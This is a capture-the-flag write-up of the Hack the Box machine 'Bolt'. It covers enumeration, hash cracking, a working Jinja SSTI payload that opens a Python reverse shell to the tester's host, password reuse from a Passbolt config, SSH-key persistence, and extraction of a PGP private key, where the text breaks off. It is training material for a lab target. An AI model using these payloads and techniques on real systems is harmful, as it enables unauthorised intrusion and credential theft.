# Bolt

This is the writeup of the box Bolt from Hack the Box (HTB).

# Port Scan

First, we’ve started with a full port scan on host.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt]
└──╼ [★]$ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.129.158.255

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Now we perform a versioned detailed port scan on open ports on host.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt]
└──╼ [★]$ sudo nmap -vv -sC -A -Pn -p 22,80,443 -oA nmap/bolt 10.129.158.255

PORT    STATE SERVICE  REASON         VERSION                                                                                                                                                 
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                            
| ssh-hostkey:                                                                                                                                                                                
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)                                                                                                                                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkj3wwSWqzkYHp9SbRMcsp8vHlgm5tTmUs0fgeuMCowimWCqCWdN358ha6zCdtC6kHBD9JjW+3puk65zr2xpd/Iq2w+UZzwVR070b3eMYn78xq+Xn6ZrJg25e5vH8+N23olPkHicT6tmYxPFp+pGo/
FDZTsRkdkDWn4T2xzWLjdq4Ylq+RlXmQCmEsDtWvNSp3PG7JJaY5Nc+gFAd67OgkH5TVKyUWu2FYrBc4KEWvt7Bs52UftoUTjodRYbOevX+WlieLHXk86OR9WjlPk8z40qs1MckPJi926adEHjlvxdtq72nY25BhxAjmLIjck5nTNX+11a9i8KSNQ23Fjs
4LiEOtlOozCFYy47+2NJzFi1iGj8J72r4EsEY+UMTLN9GW29Oz+10nLU1M+G6DQDKxoc1phz/D0GShJeQw8JhO0L+mI6AQKbn0pIo3r9/hLmZQkdXruJUn7U/7q7BDEjajVK3gPaskU/vPJRj3to8g+w+aX6IVSuVsJ6ya9x6XexE=                
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)                                                                                                                               
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF5my/tCLImcznAL+8z7XV5zgW5TMMIyf0ASrvxJ1mnfUYRSOGPKhT8vfnpuqAxdc5WjXQjehfiRGV6qUjoJ3I4=                            
|   256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGxr2nNJEycZEgdIxL1zHLHfh+IBORxIXLX1ciHymxLO                                                                                                            
80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)                                                                                                                                   
| http-methods:                                                                                                                                                                               
|_  Supported Methods: HEAD OPTIONS GET                                                                                                                                                       
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D                                                                                                                         
|_http-title:     Starter Website -  About                                                                                                                                                    
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                                                   
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)                                                                                                                                   
| http-methods:                                                                                                                                                                               
|_  Supported Methods: GET HEAD POST                                                                                                                                                          
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4                                                                                                                         
| http-title: Passbolt | Open source password manager for teams                                                                                                                               
|_Requested resource was /auth/login?redirect=%2F                                                                                                                                             
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU                                                     
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU

...

|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.
17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
```

Let’s perform a UDP port scan now.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt]                                                                                                                                 
└──╼ [★]$ sudo nmap -v -sUV -sC -Pn 10.129.158.255 -oA nmap/bolt_udp

PORT     STATE         SERVICE  VERSION
68/udp   open|filtered dhcpc
5353/udp open|filtered zeroconf
```

Let’s write down in our local hosts file the host name for the host.

![Untitled](Bolt/Untitled.png)

Accessing the webpage, we’ve got

![Untitled](Bolt/Untitled%201.png)

Accessing HTTPS.

![Untitled](Bolt/Untitled%202.png)

We access a different service on port 443.

On port 80, navigating on site, we’ve got a download docker image function. Let’s download the image.

![Untitled](Bolt/Untitled%203.png)

There is a login form and a register account page too

![Untitled](Bolt/Untitled%204.png)

Let’s create a new user.

![Untitled](Bolt/Untitled%205.png)

We couldn’t complete our register.

![Untitled](Bolt/Untitled%206.png)

We notice on title page that the application uses Jinja.

![Untitled](Bolt/Untitled%207.png)

Let’s go to the HTTPS service. We insert any email with the domain of the host.

![Untitled](Bolt/Untitled%208.png)

And we got an error message.

![Untitled](Bolt/Untitled%209.png)

It seems we have to register in the HTTP service with a valid email account.

Let’s perform a brute-force directory on the both services HTTP and HTTPS.

# Enumeration

Performing a brute-force directory on [http://passbolt.bolt.htb/](http://passbolt.bolt.htb/) we’ve got.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt]
└──╼ [★]$ gobuster dir -e -u "http://passbolt.bolt.htb/" -w "/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x py,pyc -o gobuster/bolt_root

http://passbolt.bolt.htb/register             (Status: 200) [Size: 11038]
http://passbolt.bolt.htb/login                (Status: 200) [Size: 9287] 
http://passbolt.bolt.htb/contact              (Status: 200) [Size: 26293]
http://passbolt.bolt.htb/logout               (Status: 302) [Size: 209] [--> http://passbolt.bolt.htb/]
http://passbolt.bolt.htb/download             (Status: 200) [Size: 18570]                              
http://passbolt.bolt.htb/services             (Status: 200) [Size: 22443]                              
http://passbolt.bolt.htb/profile              (Status: 500) [Size: 290]                                
http://passbolt.bolt.htb/index                (Status: 308) [Size: 257] [--> http://passbolt.bolt.htb/]
http://passbolt.bolt.htb/pricing              (Status: 200) [Size: 31731]                              
http://passbolt.bolt.htb/sign-up              (Status: 200) [Size: 11038]                              
http://passbolt.bolt.htb/sign-in              (Status: 200) [Size: 9287]                               
http://passbolt.bolt.htb/check-email          (Status: 200) [Size: 7331]                               
http://passbolt.bolt.htb/index                (Status: 308) [Size: 257] [--> http://passbolt.bolt.htb/]
```

Brute-forcing the HTTPS service.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt]
└──╼ [★]$ gobuster dir -k -e -u "https://passbolt.bolt.htb/" -w "/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x py,pyc -o gobuster/bolt_root_https

https://passbolt.bolt.htb/img                  (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/img/]
https://passbolt.bolt.htb/register             (Status: 301) [Size: 0] [--> https://passbolt.bolt.htb/users/register]
https://passbolt.bolt.htb/login                (Status: 301) [Size: 0] [--> https://passbolt.bolt.htb/auth/login]    
https://passbolt.bolt.htb/js                   (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/js/]         
https://passbolt.bolt.htb/logout               (Status: 301) [Size: 0] [--> https://passbolt.bolt.htb/auth/logout]   
https://passbolt.bolt.htb/css                  (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/css/]        
https://passbolt.bolt.htb/app                  (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Fapp]             
https://passbolt.bolt.htb/users                (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Fusers]           
https://passbolt.bolt.htb/resources            (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Fresources]       
https://passbolt.bolt.htb/fonts                (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/fonts/]      
https://passbolt.bolt.htb/groups               (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Fgroups]          
https://passbolt.bolt.htb/locales              (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/locales/]    
https://passbolt.bolt.htb/healthcheck          (Status: 403) [Size: 3738]                                            
https://passbolt.bolt.htb/recover              (Status: 301) [Size: 0] [--> https://passbolt.bolt.htb/users/recover] 
Progress: 71994 / 186852 (38.53%)                                                                                   [ERROR] 2022/02/17 00:52:08 [!] parse "https://passbolt.bolt.htb/error\x1f_log": net/url: invalid control character in URL
https://passbolt.bolt.htb/roles                (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Froles]
```

Let’s enumerate in order to find some virtual hosts (vhost) too.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt]
└──╼ [★]$ gobuster vhost -u "http://bolt.htb/" -w "/opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt" -t 50 -o gobuster/bolt_vhosts

Found: demo.bolt.htb (Status: 302) [Size: 219]
Found: mail.bolt.htb (Status: 200) [Size: 4943]
```

Let’s write it down in our local hosts file.

![Untitled](Bolt/Untitled%2010.png)

Write it down in our local hosts file just the email one shows us a different functionalitty.

![Untitled](Bolt/Untitled%2011.png)

Accessing the `demo` host name, we’ve got a login page like from the `passbolt.bolt.htb`.

![Untitled](Bolt/Untitled%2012.png)

Accessing the “Create account” link, we’ve got.

![Untitled](Bolt/Untitled%2013.png)

As we can see, this registration page is different of the another. Let’s try, now, to search for some “Invite Code” in that image we’ve downloaded from the host.

After a lot searching in the tar file we’ve downloaded, we got the invite code in one of the source code of the application.

![Untitled](Bolt/Untitled%2014.png)

Filling the registration form like following and creating our account.

![Untitled](Bolt/Untitled%2015.png)

We are redirected to the login page. Let’s log into the server.

![Untitled](Bolt/Untitled%2016.png)

We were able to login. We can see there is an AdminLTE3Dashboard Template developed in JS Bootstrap.

We’ve tried to log into the passbolt host name successfully.

![Untitled](Bolt/Untitled%2017.png)

Let’s try to insert this valid e-mail on the HTTPS service page.

![Untitled](Bolt/Untitled%2018.png)

Searching around on the image that we’ve downloaded previously, we’ve got a hash and we were able to crack it.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2]
└──╼ [★]$ strings db.sqlite3 
SQLite format 3
9tableUserUser
CREATE TABLE "User" (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        password BLOB, 
        email_confirmed BOOLEAN, 
        profile_update VARCHAR(80), 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
indexsqlite_autoindex_User_2User
indexsqlite_autoindex_User_1User
adminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
        admin
)       admin@bolt.htb
```

Cracking it.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation]
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
deadbolt         (?)
1g 0:00:00:00 DONE (2022-02-17 14:25) 1.724g/s 297931p/s 297931c/s 297931C/s doida..curtis13
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We can log into passbolt vhost using this credentials. Nothing worth.

We could log into mail vhost with our credentials that was created previously.

![Untitled](Bolt/Untitled%2019.png)

We’ve noticed that if we change something on our profile we received an email informing us that our profile was changed.

![Untitled](Bolt/Untitled%2020.png)

After a lot of search and tries, we’ve triggered a SSTI vulnerability.

![Untitled](Bolt/Untitled%2021.png)

Insert our payload on Name field and send it to our email, we’ve got the following e-mail.

![Untitled](Bolt/Untitled%2022.png)

Clicking on the link in order to confirm our changes and we could check that our SSTI payload works.

![Untitled](Bolt/Untitled%2023.png)

Now, let’s try to get a shell. Here we insert on field Name our following payload.

```bash
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.63\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'").read().zfill(417)}}{%endif%}{% endfor %}
```

Clicking on the link and checking our netcat listener.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation]
└──╼ [★]$ sudo nc -vnlp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.158.255.
Ncat: Connection from 10.129.158.255:47306.
bash: cannot set terminal process group (889): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bolt:~/demo$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let’s improve our shell.

```bash
www-data@bolt:~/demo$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bolt:~/demo$ ^Z
[1]+  Stopped                 sudo nc -vnlp 443
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation]
└──╼ [★]$ stty raw -echo && fg
sudo nc -vnlp 443

www-data@bolt:~/demo$ export TERM=xterm
www-data@bolt:~/demo$ stty rows 42 columns 190
www-data@bolt:~/demo$
```

# Horizontal Privilege Escalation

Running the [linpeas.sh](http://linpeas.sh) tool, we’ve got the MySQL database credentials.

```bash
-rw-r----- 1 root www-data 3128 Feb 25  2021 /etc/passbolt/passbolt.php                                                                                                                       
 * Passbolt ~ Open source password manager for teams                                                                                                                                          
            'host' => 'localhost',                                                                                                                                                            
            'port' => '3306',                                                                                                                                                                 
            'username' => 'passbolt',                                                                                                                                                         
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',                                                                                                                                             
            'database' => 'passboltdb',
```

Let’s try to login as eddie user using this DB password.

```bash
www-data@bolt:/tmp$ su eddie
Password: 
eddie@bolt:/tmp$ id
uid=1000(eddie) gid=1000(eddie) groups=1000(eddie)
```

| USER | PASSWORD |
| --- | --- |
| eddie | rT2;jW7<eY8!dX8}pQ8% |

Let’s write down our public SSH key on eddie authorized_keys file.

```bash
eddie@bolt:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYEZuHPpgcUujjaIvVmLukDj6QzRtcNSCpsAOFBaVeu4kngGiRfDTMA5kIVR6NfUTaoXhtCIy4kqJDDjXWfcsxQnLldYN61WgRqg/iYokepGCqIzT86RwwwIAb79P3HSXdcQ9fKl9Q9avgGQ+zR2zMTkIq1kbzOKEB/ajz9JpXZmxCvifg86pyOZ2wIQFLpAujwjKrOK45gPntQeay/hqF89zqkme7j18oUj8eleSRsyHsespcbRFLjUoQnVEfCf2noc4qw6b0C7HZXWKip0MQSuyJChLU6MNUu9QjwyV2OMolq9b7kscL+byBb8Vf3Fj3tkEYu2IZ1sBt29g9AsBiZGzCMWC9Yi8tNq3Iea1vT+w2pNCzd9RVs0TUIGWfWyEbbM0wJVA3U0didfGPKUk+cZKAtkiUZtGSsXeGM4TweYnNAC3uwYYxm0+TJ5H2pSHvSyHVF9NFbyadlgbjofMy06Tj3+xA9GiekXs8rpeOyLtRP6onbcLjS2fXz3LRKws=' > .ssh/authorized_keys
```

And login as eddie.

```bash
─[us-dedivip-1]─[10.10.14.63]─[th3g3ntl3m4n@htb]─[~/htb/Bolt/exploitation]
└──╼ [★]$ ssh eddie@bolt.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

182 updates can be applied immediately.
105 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
You have mail.
Last login: Wed Jan 26 09:54:31 2022 from 10.10.14.23
eddie@bolt:~$ id
uid=1000(eddie) gid=1000(eddie) groups=1000(eddie)
```

# Vertical Privilege Escalation

Searching a lot, again, we’ve found an email received by Eddie from Clark, the other user on the system.

```bash
eddie@bolt:~$ cat /var/mail/eddie
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
```

Searching for some PGP keys from the root of the system / we’ve got.

```bash
eddie@bolt:/$ grep -iR "BEGIN PGP" 2>/dev/null
opt/google/chrome/cron/google-chrome:    grep -q -- "-----BEGIN PGP PUBLIC KEY BLOCK-----"
opt/google/chrome/cron/google-chrome:    grep -q -- "-----BEGIN PGP PUBLIC KEY BLOCK-----"
opt/google/chrome/cron/google-chrome:-----BEGIN PGP PUBLIC KEY BLOCK-----
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:    if (!message.match(/-----BEGIN PGP MESSAGE-----/)) {
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PUBLIC_HEADER = '-----BEGIN PGP PUBLIC KEY BLOCK-----';
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  const reHeader = /^-----BEGIN PGP (MESSAGE, PART \d+\/\d+|MESSAGE, PART \d+|SIGNED MESSAGE|MESSAGE|PUBLIC KEY BLOCK|PRIVATE KEY BLOCK|SIGNATURE)-----$/m;
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  // BEGIN PGP MESSAGE, PART X/Y
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:    // BEGIN PGP MESSAGE, PART X
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      // BEGIN PGP SIGNED MESSAGE
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:        // BEGIN PGP MESSAGE
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:          // BEGIN PGP PUBLIC KEY BLOCK
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:            // BEGIN PGP PRIVATE KEY BLOCK
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // BEGIN PGP SIGNATURE
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // cleartext signatures. Note that PGP 2.x uses BEGIN PGP MESSAGE
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP MESSAGE, PART " + partindex + "/" + parttotal + "-----\r\n");
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP MESSAGE, PART " + partindex + "-----\r\n");
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("\r\n-----BEGIN PGP SIGNED MESSAGE-----\r\n");
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("\r\n-----BEGIN PGP SIGNATURE-----\r\n");
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP MESSAGE-----\r\n");
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP PUBLIC KEY BLOCK-----\r\n");
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP PRIVATE KEY BLOCK-----\r\n");
home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP SIGNATURE-----\r\n");
```

Let’s see the files that contains “BEGIN PGP PRIVATE KEY”.

```bash
eddie@bolt:~$ grep -iR "PGP PRIVATE KEY"
```

Running the command above, we find the following file.

```bash
...

Binary file ".config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log" matches
```

Let’s check this file, because it’s a log file. Here we found a possible PGP private key.

```bash
-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G
2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nR
Na6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABE
B\\r\\nAAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW\\r\\nUjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+Fhua\\r\\njS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rs
yqd0BYXXA\\r\\niOe++biDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac\\r\\n2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9/G5FDVj\\r\\nQY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzA
KxavtZZYOJkhsXaWf\\r\\nDRe3Gtmo/npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY/r4j+ld8o0YCP+76K/\\r\\n7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2\\r\\nAZkM+9snQT9azCX/H2kVVryOUmTP+uu+p+e
51z3mxxngp7AE0zHqrahugS49\\r\\ntgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2/dET8jmuKs0eHc\\r\\nUct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OP\\r\\nyF1ROfZJlwFOw4rFnmW4Qtkq+1A
YTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxj\\r\\nXTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K/b3e\\r\\nIHcUU5wuVGzUXERSBROU5dAOcR+lNT+Be+T6aCeqDxQo37k6kY6Tl1+0uvMp\\r\\neqO3/sM0cM8nQSN6Ypu
GmnYmhGAgV/Pj5t+cl2McqnWJ3EsmZTFi37Lyz1CM\\r\\nvjdUlrpzWDDCwA8VHN1QxSKv4z2+QmXSzR5FZGRpZSBKb2huc29uIDxlZGRp\\r\\nZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZ\\r\\nAQIbAwIeAQA
hCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9+Q0H\\r\\n/R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN+egxf1Yk9/qXF\\r\\nnyG1k/IImCGf9qmHwHe+EvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnyba\\r\\nqx5
j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH/Bj2CvTIdtYD454aDxNbNt\\r\\nzc5gVIg7esI2dnTkNnFWoFZ3+j8hzFmS6lJvJ0GN+Nrd/gAOkhU8P2KcDz74\\r\\n7WQQR3/eQa0m6QhOQY2q/VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3F\
\r\\nU3vUZKav7ctbWDpJU/ZJ++Q/bbQxeFPPkM+tZEyAn/fHwwYEYDgbYQEIAJpY\\r\\nHMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B/Z40fVH29l7ZsWVFHVf7obW5\\r\\nzNJUpTZHjTQV+HP0J8vPL35IG+usXKDqOKvnzQhGXwpnEtgMDLFJc
2jw0I6M\\r\\nKeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FP\\r\\nrOUeNkzYjHVuzsGAKZZzo4BMTh/H9ZV1ZKm7KuaeeE2x3vtEnZXx+aSX+Bn8\\r\\nKo+nUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7
i57n7rfWkzIW8P7\\r\\nXrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhP\\r\\nleD/IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd/a3yB4moU\\r\\nKP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/W
paPSEOG3K5lcpt5EneFC64f\\r\\na6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67\\r\\nJAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH\\r\\nkERD10SVfII2e43HFgU+wXwYR6cDS
NaNFdwbybXQ0quQuUQtUwOH7t/Kz99+\\r\\nJa9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT\\r\\nGh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlB\\r\\nGquB8QmrJA2QST4v+/xnM
LFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW+nqong\\r\\ncVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXO\\r\\nn0LJKVoiPuZr/C0gDkek/i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz\\r\\n4sOO1YdK7/88K
Wj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT\\r\\n4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h\\r\\nJ6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt\\r\\n1VrD5
poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS\\r\\nUCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU\\r\\nNsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf\\r
